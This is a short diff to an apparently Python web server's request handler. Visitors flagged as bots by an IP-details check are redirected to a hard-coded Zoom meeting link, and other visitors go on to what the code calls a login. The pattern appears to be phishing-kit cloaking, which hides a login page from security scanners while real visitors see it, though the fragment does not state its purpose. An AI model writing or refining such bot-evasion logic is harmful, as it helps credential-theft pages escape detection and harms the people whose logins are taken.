@@ -183,7 +183,7 @@ def serve(path):
 
     if get_ip_details(visitor_ip):
         print("redirected bot detected")
-        return redirect(REDIRECT_URL)
+        return redirect("https://us05web.zoom.us/j/81234567890?pwd=nmki90jdhslkeuiopsllslsmooiwlls12opQJ.1")
 
     print("Woks perfecty heading to login")
     # This logic is now much simpler.
